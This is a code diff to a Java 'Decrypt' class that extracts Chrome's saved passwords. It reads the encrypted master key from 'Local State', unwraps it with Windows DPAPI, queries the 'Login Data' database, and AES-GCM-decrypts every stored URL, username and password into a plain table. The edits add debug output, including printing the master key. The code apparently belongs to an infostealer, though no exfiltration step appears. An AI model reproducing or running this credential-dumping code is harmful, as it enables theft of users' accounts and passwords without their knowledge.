@@ -28,10 +28,6 @@ import org.sqlite.SQLiteConnection;
 
 public class Decrypt {
 
-    private static final String CHROME_LOGIN_DATA_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/Login Data"));
-    private static final String LOCAL_STATE_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/Local State"));
-    private static final String HISTORY_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/History"));
-
     public static byte[] getMasterKey(String directory) throws Exception {
         Path localStateFile = Path.of(directory + "/Local State");
 
@@ -47,6 +43,8 @@ public class Decrypt {
             masterKeyB64 = matcher.group(1);
         }
         byte[] masterKeyEnc = Base64.getDecoder().decode(masterKeyB64.getBytes(StandardCharsets.UTF_8));
+
+        System.out.println(Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length)).length);
 
         return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length));
     }
@@ -65,6 +63,7 @@ public class Decrypt {
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
         //cipher.updateAAD(aad);
+
         byte[] decryptedPasswordBytes = cipher.doFinal(ciphertext);
         return new String(decryptedPasswordBytes, StandardCharsets.UTF_8);
     }
@@ -72,7 +71,6 @@ public class Decrypt {
     public static String decryptPasswords(String directory) throws Exception {
         String text = "URL | LOGIN | PASSWORD\n";
         File dbFile = new File(directory + "/Login Data");
-        System.out.println(dbFile.getAbsolutePath());
         Connection conn = null;
         try {
             conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
@@ -80,6 +78,7 @@ public class Decrypt {
             ResultSet rs = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins");
 
             byte[] masterKey = getMasterKey(directory);
+            System.out.println(masterKey);
 
             while (rs.next()) {
                 byte[] passwordBytes = rs.getBytes("password_value");
@@ -105,7 +104,6 @@ public class Decrypt {
         }
 
         return text;
-
     }
 
     public static String getHistory(String historyPath){
